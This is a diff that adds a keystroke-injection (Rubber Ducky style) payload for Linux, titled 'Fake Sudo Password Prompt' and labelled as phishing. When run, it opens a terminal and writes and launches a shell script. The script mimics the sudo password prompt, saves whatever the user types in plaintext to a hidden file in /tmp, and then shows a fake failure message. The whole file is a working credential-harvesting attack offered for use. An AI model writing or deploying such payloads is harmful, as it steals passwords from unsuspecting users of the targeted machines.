@@ -1,0 +1,27 @@
+REM =====================================================
+REM Title: Fake Sudo Password Prompt
+REM Author: yogeshjoga
+REM Target: Linux (Ubuntu, Debian, Fedora, Kali)
+REM Category: Phishing
+REM Description: Creates a fake sudo prompt to harvest password
+REM =====================================================
+
+DELAY 1000
+CTRL-ALT t
+DELAY 1000
+STRING cat > /tmp/sudo.sh << 'EOF'
+ENTER
+STRING #!/bin/bash
+ENTER
+STRING read -sp "[sudo] password for $USER: " pass
+ENTER
+STRING echo ""
+ENTER
+STRING echo $pass > /tmp/.pass
+ENTER
+STRING echo "Sorry, try again."
+ENTER
+STRING EOF
+ENTER
+STRING chmod +x /tmp/sudo.sh && /tmp/sudo.sh
+ENTER
